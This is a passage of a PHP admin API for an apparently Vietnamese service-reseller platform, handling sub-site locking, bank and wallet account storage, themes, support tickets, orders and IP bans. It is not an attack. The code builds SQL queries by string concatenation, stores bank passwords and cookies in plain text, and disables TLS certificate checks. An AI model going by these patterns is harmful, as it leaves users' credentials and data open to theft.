            die(json_encode($return));
        } else {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Lỗi hệ thống";
            die(json_encode($return));
        }
    }


    if ($action == "set_tat_bat_site") {


        $type     = check_string($_POST['type']);
        $site_con     = check_string($_POST['site_con']);
        $username     = check_string($_POST['username']);

        $api_token = api_token();
        $checkusite = $LTT->get_row(" SELECT * FROM `users` WHERE `token` = '$api_token'  AND  `url_config` = '" . $url_site_name . "' ");

        if (empty($api_token)) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Thiếu API Token";
            die(json_encode($return));
        }

        if (!$checkusite) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "API Token không hợp lệ";
            die(json_encode($return));
        }

        if ($checkusite['capbac'] != 99) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Bạn không phải ADMIN !";
            die(json_encode($return));
        }


        if (empty($site_con)) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Đã xảy ra lỗi !";
            die(json_encode($return));
        }
        if (empty($type)) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Đã xảy ra lỗi !";
            die(json_encode($return));
        }
        if (empty($username)) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Đã xảy ra lỗi !";
            die(json_encode($return));
        }


        if ($type == "khoa_site") {
            $trang_thai = "Band Site $site_con";
            $update1 = $LTT->update("ds_sitecon", [
                'status' => 'Band'
            ], " `username` = '" . $username . "' AND `site_con` = '" . $site_con . "' ");


            $update4 = $LTT->update("setting", [
                'status' => 'Band'
            ], " `url_config` = '" . $site_con . "' ");
        } elseif ($type == "mo_site") {
            $trang_thai = "Mở Site $site_con";
            $update1 = $LTT->update("ds_sitecon", [
                'status' => 'Active'
            ], " `username` = '" . $username . "' AND `site_con` = '" . $site_con . "' ");

            $update4 = $LTT->update("setting", [
                'status' => 'Active'
            ], " `url_config` = '" . $site_con . "' ");
        }




        if ($update1) {
            $return['status'] = true;
            $return['error'] = false;
            $return['message']   = "$trang_thai thành công !";
            die(json_encode($return));
        } else {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Lỗi";
            die(json_encode($return));
        }
    }

    if ($action == "addmbbank") {
        $account = check_string(strtoupper($_POST['account']));
        $password     = check_string($_POST['password']);
        $accountno     = check_string($_POST['accountno']);

        if (empty($account)) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Thiếu tên tài khoản";
            die(json_encode($return));
        }

        if (empty($password)) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Thiếu mật khẩu";
            die(json_encode($return));
        }

        if (empty($accountno)) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Thiếu số tài khoản";
            die(json_encode($return));
        }

        $api_token = api_token();
        $checkusite = $LTT->get_row(" SELECT * FROM `users` WHERE `token` = '$api_token'  AND  `url_config` = '" . $url_site_name . "' ");

        if (empty($api_token)) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Thiếu API Token";
            die(json_encode($return));
        }

        if (!$checkusite) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "API Token không hợp lệ";
            die(json_encode($return));
        }

        if ($checkusite['capbac'] != 99) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Bạn không phải ADMIN !";
            die(json_encode($return));
        }

        $create2 = $LTT->get_row("SELECT * FROM `mbbankauto` WHERE `sitename` = '$url_site_name' AND `accountno` = '$accountno'");

        if ($create2) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Tài khoản này đã tồn tại !";
            die(json_encode($return));
        } else {
            $create = $LTT->insert("mbbankauto", [
                'account'       => $account,
                'password' => $password,
                'accountno' => $accountno,
                'balance' => 0,
                'sitename'          => $url_site_name,
            ]);

            if ($create) {
                $return['status'] = true;
                $return['error'] = false;
                $return['message']   = "Thêm thành công !";
                die(json_encode($return));
            } else {
                $return['status'] = false;
                $return['error'] = true;
                $return['message']   = "Đã xảy ra lỗi !";
                die(json_encode($return));
            }
        }
    }

    if ($action == "delete_mbbank") {
        $id = check_string(strtoupper($_POST['id']));

        if (empty($id)) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Thiếu tên tài khoản";
            die(json_encode($return));
        }

        $api_token = api_token();
        $checkusite = $LTT->get_row(" SELECT * FROM `users` WHERE `token` = '$api_token'  AND  `url_config` = '" . $url_site_name . "' ");

        if (empty($api_token)) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Thiếu API Token";
            die(json_encode($return));
        }

        if (!$checkusite) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "API Token không hợp lệ";
            die(json_encode($return));
        }

        if ($checkusite['capbac'] != 99) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Bạn không phải ADMIN !";
            die(json_encode($return));
        }

        $create2 = $LTT->get_row("SELECT * FROM `mbbankauto` WHERE `sitename` = '$url_site_name' AND `id` = '$id'");

        if ($create2) {
            $remove = $LTT->remove('mbbankauto', "`sitename` = '$url_site_name' AND `id` = '$id'");

            if ($remove) {
                $return['status'] = true;
                $return['message']   = "Xóa thành công !";
                die(json_encode($return));
            } else {
                $return['status'] = false;
                $return['error'] = true;
                $return['message']   = "Xóa thất bại !";
                die(json_encode($return));
            }
        } else {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Tài khoản này hông tồn tại !";
            die(json_encode($return));
        }
    }

    if ($action == "addthesieure") {
        $account = check_string(strtoupper($_POST['account']));
        $password     = check_string($_POST['password']);
        $cookie     = check_string($_POST['cookie']);

        if (empty($account)) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Thiếu tên tài khoản";
            die(json_encode($return));
        }

        if (empty($password)) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Thiếu mật khẩu";
            die(json_encode($return));
        }

        if (empty($cookie)) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Thiếu cookie";
            die(json_encode($return));
        }

        $api_token = api_token();
        $checkusite = $LTT->get_row(" SELECT * FROM `users` WHERE `token` = '$api_token'  AND  `url_config` = '" . $url_site_name . "' ");

        if (empty($api_token)) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Thiếu API Token";
            die(json_encode($return));
        }

        if (!$checkusite) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "API Token không hợp lệ";
            die(json_encode($return));
        }

        if ($checkusite['capbac'] != 99) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Bạn không phải ADMIN !";
            die(json_encode($return));
        }

        $create2 = $LTT->get_row("SELECT * FROM `thesieureauto` WHERE `sitename` = '$url_site_name' AND `account` = '$account'");

        if ($create2) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Tài khoản này đã tồn tại !";
            die(json_encode($return));
        } else {
            $create = $LTT->insert("thesieureauto", [
                'account'       => $account,
                'password' => $password,
                'cookie' => $cookie,
                'sitename'          => $url_site_name,
            ]);

            if ($create) {
                $return['status'] = true;
                $return['error'] = false;
                $return['message']   = "Thêm thành công !";
                die(json_encode($return));
            } else {
                $return['status'] = false;
                $return['error'] = true;
                $return['message']   = "Đã xảy ra lỗi !";
                die(json_encode($return));
            }
        }
    }

    if ($action == "delete_thesieure") {
        $id = check_string(strtoupper($_POST['id']));

        if (empty($id)) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Thiếu tên tài khoản";
            die(json_encode($return));
        }

        $api_token = api_token();
        $checkusite = $LTT->get_row(" SELECT * FROM `users` WHERE `token` = '$api_token'  AND  `url_config` = '" . $url_site_name . "' ");

        if (empty($api_token)) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Thiếu API Token";
            die(json_encode($return));
        }

        if (!$checkusite) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "API Token không hợp lệ";
            die(json_encode($return));
        }

        if ($checkusite['capbac'] != 99) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Bạn không phải ADMIN !";
            die(json_encode($return));
        }

        $create2 = $LTT->get_row("SELECT * FROM `thesieureauto` WHERE `sitename` = '$url_site_name' AND `id` = '$id'");

        if ($create2) {
            $remove = $LTT->remove('thesieureauto', "`sitename` = '$url_site_name' AND `id` = '$id'");

            if ($remove) {
                $return['status'] = true;
                $return['message']   = "Xóa thành công !";
                die(json_encode($return));
            } else {
                $return['status'] = false;
                $return['error'] = true;
                $return['message']   = "Xóa thất bại !";
                die(json_encode($return));
            }
        } else {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Tài khoản này hông tồn tại !";
            die(json_encode($return));
        }
    }

    if ($action == "delete_momo") {
        $id = check_string(strtoupper($_POST['id']));

        if (empty($id)) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Thiếu tên tài khoản";
            die(json_encode($return));
        }

        $api_token = api_token();
        $checkusite = $LTT->get_row(" SELECT * FROM `users` WHERE `token` = '$api_token'  AND  `url_config` = '" . $url_site_name . "' ");

        if (empty($api_token)) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Thiếu API Token";
            die(json_encode($return));
        }

        if (!$checkusite) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "API Token không hợp lệ";
            die(json_encode($return));
        }

        if ($checkusite['capbac'] != 99) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Bạn không phải ADMIN !";
            die(json_encode($return));
        }

        $create2 = $LTT->get_row("SELECT * FROM `cron_momo` WHERE `sitename` = '$url_site_name' AND `id` = '$id'");

        if ($create2) {
            $remove = $LTT->remove('cron_momo', "`sitename` = '$url_site_name' AND `id` = '$id'");

            if ($remove) {
                $return['status'] = true;
                $return['message']   = "Xóa thành công !";
                die(json_encode($return));
            } else {
                $return['status'] = false;
                $return['error'] = true;
                $return['message']   = "Xóa thất bại !";
                die(json_encode($return));
            }
        } else {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Tài khoản này hông tồn tại !";
            die(json_encode($return));
        }
    }

    if ($action == "set_themes") {

        $color_web = check_string($_POST['color_web']);
        $theme_login     = check_string($_POST['theme_login']);

        $theme_landing     = check_string($_POST['theme_landing']);
        if ($color_web == "") {


            $modal_color = check_string($_POST['modal_color']);
            $bg_navbar_site    = check_string($_POST['bg_navbar_site']);
            $icon_color_site    = check_string($_POST['icon_color_site']);
            $text_color_site    = check_string($_POST['text_color_site']);
            $bg_header_site    = check_string($_POST['bg_header_site']);
        }
        $api_token = api_token();
        $checkusite = $LTT->get_row(" SELECT * FROM `users` WHERE `token` = '$api_token'  AND  `url_config` = '" . $url_site_name . "' ");

        if (empty($api_token)) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Thiếu API Token";
            die(json_encode($return));
        }

        if (!$checkusite) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "API Token không hợp lệ";
            die(json_encode($return));
        }

        if ($checkusite['capbac'] != 99) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Bạn không phải ADMIN !";
            die(json_encode($return));
        }



        if (empty($theme_login)) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Vui lòng chọn một giao diện";
            die(json_encode($return));
        }
        if (empty($theme_landing)) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Vui lòng chọn một giao diện";
            die(json_encode($return));
        }

        if ($color_web == "") {
            $update_color = $LTT->update("setting", [
                'bg_navbar_site' => $bg_navbar_site,
                'icon_color_site' => $icon_color_site,
                'text_color_site' => $text_color_site,
                'bg_header_site' => $bg_header_site,
                'modal_color' => $modal_color,
            ], " `url_config` = '" . $url_site_name . "' ");
        }
        $update1 = $LTT->update("setting", [
            'theme_home' => $theme_home
        ], " `url_config` = '" . $url_site_name . "' ");

        $update2sf3 = $LTT->update("setting", [
            'theme_login' => $theme_login
        ], " `url_config` = '" . $url_site_name . "' ");

        $update2222rr2 = $LTT->update("setting", [
            'color_web' => $color_web
        ], " `url_config` = '" . $url_site_name . "' ");

        $update3 = $LTT->update("setting", [
            'theme_landing' => $theme_landing
        ], " `url_config` = '" . $url_site_name . "' ");

        if ($update1 || $update2sf3 || $update3 || $update_color) {
            $return['status'] = true;
            $return['error'] = false;
            $return['message']   = "cập nhật giao diện thành công !";
            die(json_encode($return));
        } else {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Lỗi thêm ngân hàng";
            die(json_encode($return));
        }
    }
    if ($action == "set_dk_tao_site") {


        $so_tieu_tao_site     = check_string($_POST['so_tieu_tao_site']);
        $cap_bac_tao_site     = check_string($_POST['cap_bac_tao_site']);
        $so_du_tao_site     = check_string($_POST['so_du_tao_site']);

        $api_token = api_token();
        $checkusite = $LTT->get_row(" SELECT * FROM `users` WHERE `token` = '$api_token'  AND  `url_config` = '" . $url_site_name . "' ");

        if (empty($api_token)) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Thiếu API Token";
            die(json_encode($return));
        }

        if (!$checkusite) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "API Token không hợp lệ";
            die(json_encode($return));
        }

        if ($checkusite['capbac'] != 99) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Bạn không phải ADMIN !";
            die(json_encode($return));
        }


        if (empty($so_tieu_tao_site)) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Vui điền đủ !";
            die(json_encode($return));
        }

        if (empty($so_du_tao_site)) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Vui điền đủ !";
            die(json_encode($return));
        }




        $update1 = $LTT->update("setting", [
            'so_tieu_tao_site' => $so_tieu_tao_site
        ], " `url_config` = '" . $url_site_name . "' ");

        $update2 = $LTT->update("setting", [
            'cap_bac_tao_site' => $cap_bac_tao_site
        ], " `url_config` = '" . $url_site_name . "' ");

        $update3 = $LTT->update("setting", [
            'so_du_tao_site' => $so_du_tao_site
        ], " `url_config` = '" . $url_site_name . "' ");

        if ($update1 || $update2 || $update3) {
            $return['status'] = true;
            $return['error'] = false;
            $return['message']   = "cập nhật thành công !";
            die(json_encode($return));
        } else {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Lỗi!";
            die(json_encode($return));
        }
    }



























    if ($action == "set_sua_ho_tro") {


        $id     = check_string($_POST['id']);
        $loai_ho_tro    = check_string($_POST['loai_ho_tro']);
        $noi_dung_xu_ly     = check_string($_POST['noi_dung_xu_ly']);

        $api_token = api_token();
        $checkusite = $LTT->get_row(" SELECT * FROM `users` WHERE `token` = '$api_token'  AND  `url_config` = '" . $url_site_name . "' ");

        if (empty($api_token)) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Thiếu API Token";
            die(json_encode($return));
        }

        if (!$checkusite) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "API Token không hợp lệ";
            die(json_encode($return));
        }

        if ($checkusite['capbac'] != 99) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Bạn không phải ADMIN !";
            die(json_encode($return));
        }


        if (empty($id)) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Lỗi ";
            die(json_encode($return));
        }
        if (empty($loai_ho_tro)) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Lỗi";
            die(json_encode($return));
        }
        if (empty($noi_dung_xu_ly)) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Nhập Nội Dung Xử Lý !";
            die(json_encode($return));
        }

        $check_ho_tro = $LTT->get_row(" SELECT * FROM `list_hotro` WHERE `loai_hotro` = '" . $loai_ho_tro . "' AND `id` = '" . $id . "' AND `url_config` = '" . $url_site_name . "' ");
        $check_name_ho_tro = $LTT->get_row(" SELECT * FROM `users` WHERE `username` = '" . $check_ho_tro['username'] . "' AND `url_config` = '" . $url_site_name . "' ");
        if ($check_ho_tro['status'] == "done") {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Đã Được Xử Lý  Trừ Trước Rồi!";
            die(json_encode($return));
        } else {


            $update1 = $LTT->update("list_hotro", [
                'noi_dung_xuly' => $noi_dung_xu_ly,
                'status' => 'done'
            ], " `loai_hotro` = '" . $loai_ho_tro . "' AND `id` = '" . $id . "' AND `url_config` = '" . $url_site_name . "' ");
        }
        if ($update1) {

            $data = array(
                'email' => $check_name_ho_tro['email'],
                'subject' => 'ĐÃ XỬ LÝ HỖ TRỢ',
                'noidung' => '<h2>Thông Báo</h2>
        
        <h3>Nội Dung: Chúng tôi đã xử lý đơn cần hỗ trợ của bạn.</h3><br>
    <font color="#e34d4d">Cảm ơn bạn đã tin dùng dịch vụ của chúng tôi !</font>
     '
            );
            $head = array(
                "user-agent: Mozilla/5.0 (Linux; Android 11; Redmi Note 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36"
            );
            $url = "https://" . strtolower($url_site_name) . "/auth/tools/mail.php";
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_HTTPHEADER, $head);

            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
            curl_setopt($ch, CURLOPT_ENCODING, true);
            $login_data = json_decode(curl_exec($ch));
            curl_close($ch);


            $return['status'] = true;
            $return['error'] = false;
            $return['message']   = "Xử Lý Thành Công !";
            die(json_encode($return));
        } else {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Lỗi Gửi Xử Lý !";
            die(json_encode($return));
        }
    }





    if ($action == "set_sua_don_dv") {

        $trang_thai = check_string($_POST['trang_thai']);
        $id_dv     = check_string($_POST['id_dv']);
        $ma_gd     = check_string($_POST['ma_gd']);
        $username     = check_string($_POST['username']);
        $number_star    = check_string($_POST['number_star']);
        $number_end     = check_string($_POST['number_end']);
        $api_token = api_token();
        $checkusite = $LTT->get_row(" SELECT * FROM `users` WHERE `token` = '$api_token'  AND  `url_config` = '" . $url_site_name . "' ");

        if (empty($api_token)) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Thiếu API Token";
            die(json_encode($return));
        }

        if (!$checkusite) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "API Token không hợp lệ";
            die(json_encode($return));
        }

        if ($checkusite['capbac'] != 99) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Bạn không phải ADMIN !";
            die(json_encode($return));
        }


        if (empty($number_star)) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Vui điền đủ !";
            die(json_encode($return));
        }





        $update1 = $LTT->update("history_buy", [
            'number_star' => $number_star,
            'number_end' => $number_end,
            'status' => $trang_thai
        ], " `id` = '" . $id_dv . "' AND `ma_gd` = '" . $ma_gd . "' AND `username` = '" . $username . "' AND `url_config` = '" . $url_site_name . "'  ");




        if ($update1) {
            $return['status'] = true;
            $return['error'] = false;
            $return['message']   = "cập nhật thành công !";
            die(json_encode($return));
        } else {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Lỗi!";
            die(json_encode($return));
        }
    }




    if ($action == "band_ip") {
        $api_token = api_token();
        $checkusite = $LTT->get_row(" SELECT * FROM `users` WHERE `token` = '$api_token'  AND  `url_config` = '" . $url_site_name . "' ");

        if (empty($api_token)) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Thiếu API Token";
            die(json_encode($return));
        }

        if (!$checkusite) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "API Token không hợp lệ";
            die(json_encode($return));
        }

        if ($checkusite['capbac'] != 99) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Bạn không phải ADMIN !";
            die(json_encode($return));
        } else {

            $ip_band    = check_string($_POST['ip_band']);
            $check_ip = $LTT->get_row(" SELECT * FROM `band_ip` WHERE `ip_band` = '$ip_band'  AND  `url_config` = '" . $url_site_name . "' ");
            if ($check_ip) {
                $return['status'] = false;
                $return['error'] = true;
                $return['message']   = "IP này đã bị khoá trước đó !";
                die(json_encode($return));
            } else {
                $create2 = $LTT->insert("band_ip", [
                    'ip_band'       => $ip_band,
                    'status' => 'block',
                    'url_config'          => $url_site_name,
                ]);
                if ($create2) {
                    $return['status'] = true;
                    $return['error'] = false;
                    $return['message']   = "Khoá Thành Công IP: $ip_band !";
                    die(json_encode($return));
                } else {
                    $return['status'] = false;
                    $return['error'] = true;
                    $return['message']   = "Lỗi hệ thống !";
                    die(json_encode($return));
                }
            }
        }
    }


    if ($action == "xoa_ip_band") {
        $api_token = api_token();
        $checkusite = $LTT->get_row(" SELECT * FROM `users` WHERE `token` = '$api_token'  AND  `url_config` = '" . $url_site_name . "' ");

        if (empty($api_token)) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Thiếu API Token";
            die(json_encode($return));
        }

        if (!$checkusite) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "API Token không hợp lệ";
            die(json_encode($return));
        }

        if ($checkusite['capbac'] != 99) {
            $return['status'] = false;
            $return['error'] = true;
            $return['message']   = "Bạn không phải ADMIN !";
            die(json_encode($return));
        } else {

            $ip_band    = check_string($_POST['xoa_ip_band']);
            $check_ip = $LTT->get_row(" SELECT * FROM `band_ip` WHERE `ip_band` = '$ip_band'  AND  `url_config` = '" . $url_site_name . "' ");
            if (!$check_ip) {
                $return['status'] = false;
                $return['error'] = true;
                $return['message']   = "Không tồn tại ip này !";
                die(json_encode($return));
            } else {
                $xoa_user = $LTT->remove("band_ip", "`ip_band` = '$ip_band'  AND  `url_config` = '" . $url_site_name . "' ");
                if ($xoa_user) {
                    $return['status'] = true;
                    $return['error'] = false;
                    $return['message']   = "Xoá Thành Công IP: $ip_band !";
                    die(json_encode($return));
                } else {
                    $return['status'] = false;
                    $return['error'] = true;
                    $return['message']   = "Lỗi hệ thống !";
                    die(json_encode($return));
                }
            }
        }
    }
}
